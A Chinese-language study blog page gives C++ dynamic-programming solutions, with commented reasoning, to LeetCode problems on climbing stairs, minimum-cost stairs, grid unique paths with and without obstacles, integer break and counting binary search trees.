<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]表示 爬i个台阶 可能的方法总数</span></span><br><span class="line"><span class="comment">    对于 dp[i]：两种情况</span></span><br><span class="line"><span class="comment">        dp[i] = dp[i-1](再跳一下)</span></span><br><span class="line"><span class="comment">        dp[i] = dp[i-2](再跳两下)</span></span><br><span class="line"><span class="comment">    因此，dp[i] = dp[i-1]+dp[i-2]</span></span><br><span class="line"><span class="comment">    初始化：</span></span><br><span class="line"><span class="comment">        dp[0]=0; dp[1]=1; dp[2]=2;</span></span><br><span class="line"><span class="comment">    遍历边界：总共爬n阶</span></span><br><span class="line"><span class="comment">        for(i=3;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">    注意：前面的判断</span></span><br><span class="line"><span class="comment">        if(n&lt;3)</span></span><br><span class="line"><span class="comment">            return n;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    滚动数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//vector&lt;int&gt; dp(n+1);</span></span><br><span class="line">        <span class="keyword">if</span>(n&lt;<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">int</span> dp[<span class="number">3</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">2</span>]=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            sum = dp[<span class="number">1</span>]+dp[<span class="number">2</span>];</span><br><span class="line">            dp[<span class="number">1</span>] = dp[<span class="number">2</span>];</span><br><span class="line">            dp[<span class="number">2</span>] = sum; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="爬楼梯-扩展"><a href="#爬楼梯-扩展" class="headerlink" title="爬楼梯-扩展"></a>爬楼梯-扩展</h3><p><strong>新问题：</strong>一步一个台阶，两个台阶，三个台阶，直到 m个台阶，有多少种方法爬到n阶楼顶。</p>
<p><strong>背包解决：</strong><br>1阶，2阶，…. m阶就是物品，楼顶就是背包。<br>每一阶可以重复使用，例如跳了1阶，还可以继续跳1阶。<br>问跳到楼顶有几种方法其实就是问装满背包有几种方法。<br>【排列问题】：1、2 步 和 2、1 步都是上三个台阶，但是这两种方法不一样！<br>【完全背包】：每一步可走多次</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123; <span class="comment">// 遍历背包</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">                <span class="keyword">if</span> (i-j &gt;= <span class="number">0</span>) </span><br><span class="line">                    dp[i] += dp[i-j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="746-使用最小花费爬楼梯"><a href="#746-使用最小花费爬楼梯" class="headerlink" title="746 使用最小花费爬楼梯"></a>746 使用最小花费爬楼梯</h3><p>给你一个整数数组 cost ，其中 cost[i] 是从楼梯第 i 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。<br>你可以选择从下标为 0 或下标为 1 的台阶开始爬楼梯。<br>请你计算并返回达到楼梯顶部的最低花费。<br><img src="https://img-blog.csdnimg.cn/7d6cfb0e729d47cd97558cd9a048d702.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]   爬到第i个台阶，需要花费的代价</span></span><br><span class="line"><span class="comment">    dp[0] = 0</span></span><br><span class="line"><span class="comment">    dp[1] = cost[0]</span></span><br><span class="line"><span class="comment">    dp[2] = min(dp[0]+cost[0],dp[1]+cost[1])</span></span><br><span class="line"><span class="comment">    总共cost n个，顶层是第n+1个台阶</span></span><br><span class="line"><span class="comment">    dp[i] = min(dp[i-1]+cost[i-1],dp[i-2]+cost[i-2]);</span></span><br><span class="line"><span class="comment">    分了两种情况，对应从第一个台阶开始跳和从第二个台阶开始跳</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp2</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//从第一个 台阶开始跳</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = cost[<span class="number">0</span>]; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从第二个 台阶开始跳</span></span><br><span class="line">        dp2[<span class="number">1</span>] = <span class="number">0</span>; dp2[<span class="number">2</span>] = cost[<span class="number">1</span>];  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp2[i] = <span class="built_in">min</span>(dp2[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp2[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for(int i=0;i&lt;=n;i++)&#123;</span></span><br><span class="line">          <span class="comment">//  cout&lt;&lt;dp[i]&lt;&lt;&quot; &quot;;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">min</span>(dp[n],dp2[n]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    之后，发现，不用分两次</span></span><br><span class="line"><span class="comment">    只用dp[0]=0; dp[1]=0;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minCostClimbingStairs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = cost.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//初始化，从前两个台阶开始，都是0</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[i<span class="number">-1</span>]+cost[i<span class="number">-1</span>],dp[i<span class="number">-2</span>]+cost[i<span class="number">-2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62 不同路径"></a>62 不同路径</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。<br>机器人<strong>每次只能向下或者向右移动一步</strong>。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。<br>问总共有多少条不同的路径？<br><img src="https://img-blog.csdnimg.cn/af2ae70b76d848bf92df604ae032cdb8.png"><br><strong>总共有多少条？而不是求最短的那条！应该考虑所以情况</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j]走到i行j列处 【有多少条路径】</span></span><br><span class="line"><span class="comment">    从dp[0][0] 到 dp[m][n]</span></span><br><span class="line"><span class="comment">    要么向右走，要么向下走</span></span><br><span class="line"><span class="comment">    dp[0][0]=0; dp[0][1]=1; dp[1][0]=1; 求 dp[m][n]</span></span><br><span class="line"><span class="comment">    对于dp[i][j]，两种情况到达：</span></span><br><span class="line"><span class="comment">        从左边来：dp[i][j] = dp[i][j-1]</span></span><br><span class="line"><span class="comment">        从上边来：dp[i][j] = dp[i-1][j]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//自己写的！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[m][n];</span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">1</span>||n==<span class="number">1</span>)<span class="comment">//我这里必须写上这个的原因是 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>; dp[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">1</span>; dp[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">1</span>; <span class="comment">//【这里】如果题目m或者n是1的话，根本不能存在[1]项</span></span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**这块也根本不需要</span></span><br><span class="line"><span class="comment">        for(int i=1;i&lt;m;i++)&#123;</span></span><br><span class="line"><span class="comment">            for(int j=1;j&lt;n;j++)&#123;</span></span><br><span class="line"><span class="comment">                dp[i][j] = 2;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                cout &lt;&lt; dp[i][j] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//简化之后</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePaths</span><span class="params">(<span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));<span class="comment">//这样就相当于全部初始化0了</span></span><br><span class="line">        <span class="comment">//初始化 从0开始</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//赋第一行：1 n列</span></span><br><span class="line">            dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;<span class="comment">//赋第一列：1 m行</span></span><br><span class="line">            dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;j++)&#123;</span><br><span class="line">                cout &lt;&lt; dp[i][j] &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="63-不同路径-II"><a href="#63-不同路径-II" class="headerlink" title="63 不同路径 II"></a>63 不同路径 II</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish”）。<br>现在考虑网格中<strong>有障碍物</strong>。那么从左上角到右下角将会有多少条不同的路径？<br>网格中的障碍物和空位置分别用 1 和 0 来表示。<br><img src="https://img-blog.csdnimg.cn/70fbe9a4c1d740e1a6a84d7d0ae198a8.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    首先找到障碍物处：dp[i][j]==1处</span></span><br><span class="line"><span class="comment">    障碍物会影响到的地方：</span></span><br><span class="line"><span class="comment">        障碍物右边处：只能从上边来 dp[i][j+1] = dp[i-1][j+1]</span></span><br><span class="line"><span class="comment">        障碍物下边处：只能从左边来 dp[i+1][j] = dp[i+1][j-1]</span></span><br><span class="line"><span class="comment">    其他地方不影响</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//注释的地方都是 我理解有误的地方</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; obstacleGrid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = obstacleGrid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(m,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//注意：当起始位置 或者 终点处就是障碍物，结果 是0条</span></span><br><span class="line">        <span class="keyword">if</span>(obstacleGrid[m<span class="number">-1</span>][n<span class="number">-1</span>]==<span class="number">1</span> || obstacleGrid[<span class="number">0</span>][<span class="number">0</span>]==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(m==<span class="number">1</span> &amp;&amp; n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n &amp;&amp; obstacleGrid[<span class="number">0</span>][i]==<span class="number">0</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//if(obstacleGrid[0][i]==0)</span></span><br><span class="line">                dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m &amp;&amp; obstacleGrid[j][<span class="number">0</span>]==<span class="number">0</span>;j++)&#123;</span><br><span class="line">            <span class="comment">//if(obstacleGrid[j][0]==0)</span></span><br><span class="line">                dp[j][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obstacleGrid[i][j]==<span class="number">1</span>)&#123;<span class="comment">//障碍物处</span></span><br><span class="line">                    <span class="comment">//dp[i][j+1] = dp[i-1][j+1];</span></span><br><span class="line">                    <span class="comment">//dp[i+1][j] = dp[i+1][j-1];</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="343-整数拆分"><a href="#343-整数拆分" class="headerlink" title="343 整数拆分"></a>343 整数拆分</h3><p>给定一个正整数 n ，将其拆分为 k 个 正整数 的和（ k &gt;= 2 ），并使这些整数的乘积最大化。<br>返回 你可以获得的最大乘积 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]正整数i拆分之后乘积的最大值</span></span><br><span class="line"><span class="comment">    dp[2]=1 2=1+1 1*1=1</span></span><br><span class="line"><span class="comment">    dp[3]=2 3=1+2 1*2=2 3拆为1和2,2又拆为1和1</span></span><br><span class="line"><span class="comment">    拆i:</span></span><br><span class="line"><span class="comment">        拆成2个数：j*(i-j)</span></span><br><span class="line"><span class="comment">        拆成3个数：j*dp[i-j]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;<span class="comment">//j&lt;=i/2 要想使得乘积最大，j至少也会拆为i/2</span></span><br><span class="line">                <span class="comment">//dp[i] = max(&#123;dp[i],j*(i-j),j*dp[i-j]&#125;);</span></span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i], <span class="built_in">max</span>((i - j) * j, dp[i - j] * j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    贪心：数学</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">integerBreak</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">3</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">4</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            result *= <span class="number">3</span>;</span><br><span class="line">            n -= <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result *= n;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96 不同的二叉搜索树"></a>96 不同的二叉搜索树</h3><p>给你一个整数 n ，求恰由 n 个节点组成且节点值从 1 到 n 互不相同的 二叉搜索树 有多少种？返回满足题意的二叉搜索树的种数。<br><img src="https://img-blog.csdnimg.cn/4a0c4d23fa5d4b0f97ecd255e01e0c5e.png"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i]：节点是1至i-组成的二叉搜索树的个数为dp[i]</span></span><br><span class="line"><span class="comment">    dp[0]=1;//注意</span></span><br><span class="line"><span class="comment">    dp[1]=1;</span></span><br><span class="line"><span class="comment">    dp[2]=2;</span></span><br><span class="line"><span class="comment">    dp[3]=5;dp[3]，就是 元素1为头结点搜索树的数量 + 元素2为头结点搜索树的数量 + 元素3为头结点搜索树的数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素1为头结点搜索树的数量 = 右子树有2个元素的搜索树数量 * 左子树有0个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素2为头结点搜索树的数量 = 右子树有1个元素的搜索树数量 * 左子树有1个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">元素3为头结点搜索树的数量 = 右子树有0个元素的搜索树数量 * 左子树有2个元素的搜索树数量</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">有2个元素的搜索树数量就是dp[2]。</span></span><br><span class="line"><span class="comment">有1个元素的搜索树数量就是dp[1]。</span></span><br><span class="line"><span class="comment">有0个元素的搜索树数量就是dp[0]。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">所以dp[3] = dp[2]*dp[0] + dp[1]*dp[1] + dp[0]*dp[2]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    dp[i] += dp[以j为头结点左子树节点数量] * dp[以j为头结点右子树节点数量]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    j相当于是头结点的元素，从1遍历到i为止。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    所以递推公式：dp[i] += dp[j-1] * dp[i-j]; ，j-1为j为头结点左子树节点数量，i-j为以j为头结点右子树节点数量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="comment">//二叉树是有方向的，左子树和右子树 是两颗不同的树</span></span><br><span class="line">        <span class="comment">//我总是习惯初始化这些，其中有个非常严重的问题：参数n根本不一定存在dp[2]d[1]啊！！！</span></span><br><span class="line">        <span class="comment">//dp[0]=1; dp[1]=1; dp[2]=2;</span></span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;  </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;<span class="comment">//于是改为了 从1开始</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;<span class="comment">//j遍历头结点1~i</span></span><br><span class="line">                dp[i] += dp[j<span class="number">-1</span>] * dp[i-j];<span class="comment">//总共i个结点</span></span><br><span class="line">                <span class="comment">//以j为头结点的左子树+以j为头结点的右子树</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
